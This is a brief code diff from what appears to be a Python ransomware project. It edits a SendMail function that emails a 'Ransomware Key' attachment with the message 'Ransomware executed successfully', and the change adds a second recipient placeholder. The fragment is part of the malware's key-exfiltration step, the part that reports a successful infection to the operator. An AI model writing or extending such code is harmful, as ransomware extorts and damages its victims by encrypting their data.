@@ -9,7 +9,7 @@ from email import encoders
 
 def SendMail():
     remitente = 'CORREO'
-    destinatarios = ['CORREO']
+    destinatarios = ['CORREO',"OTROS"]
     asunto = 'Ransomware Key'
     cuerpo = 'Ransomware Ejecutado Con exito!'
     ruta_adjunto = 'NOMBRE_ARCHIVO (RUTA_ARCHIVO)'
